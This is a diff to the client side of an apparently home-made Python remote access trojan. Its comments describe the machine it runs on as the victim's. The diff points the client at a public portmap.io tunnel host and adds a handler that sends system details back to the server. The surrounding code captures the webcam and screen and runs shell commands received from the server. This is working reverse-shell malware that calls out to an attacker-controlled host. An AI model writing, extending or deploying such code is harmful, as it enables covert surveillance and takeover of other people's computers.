@@ -12,6 +12,7 @@ import pyautogui
 import numpy as np 
 import cv2
 import pyscreenshot as ImageGrab
+import platform
 
 # to record screen
 def capture_screen():
@@ -52,10 +53,10 @@ def capture_webcam():
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine
 
-#host="KartikBansal-35135.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
-#port=35135  # it will store port number on which server is listening
-host="192.168.29.157"
-port=5050
+host="KartikBansal-35135.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
+port=35135  # it will store port number on which server is listening
+#host="192.168.29.157"
+#port=5050
 
 s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
 					   # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
@@ -64,7 +65,14 @@ s.connect((host,port)) # it requests a connection from victim's socket to the sp
 while True:  # An infinite loop to execute multiple commands recieved from server
 	try:
 		data=s.recv(20480) # recieving data in form of bytes from server(1024 B chunk)
-	
+		
+		if data[:].decode() == "sysinfo":
+			my_system = platform.uname()
+ 
+			output=f"System: {my_system.system}\n"+f"Node Name: {my_system.node}\n"+f"Release: {my_system.release}\n"+f"Version: {my_system.version}\n"+f"Machine: {my_system.machine}\n"+f"Processor: {my_system.processor}\n"
+			output+= os.getcwd() + "> "
+			s.send(output.encode())
+			continue
 
 		if data[:].decode() == "webcam":
 			s.send("capturing_webcam".encode())
@@ -74,7 +82,6 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 			data=f.read()
 
 			l=len(data)
-			print(l)
 			s.send(str(l).encode())
 
 			response=s.recv(20480)
@@ -158,7 +165,6 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 	             
 			cmd.terminate()                      # terminating child process after each command
 	except Exception as e:
-		print(e)
 		print("Connection has been closed by server!!!")
 		s.close()
 		break
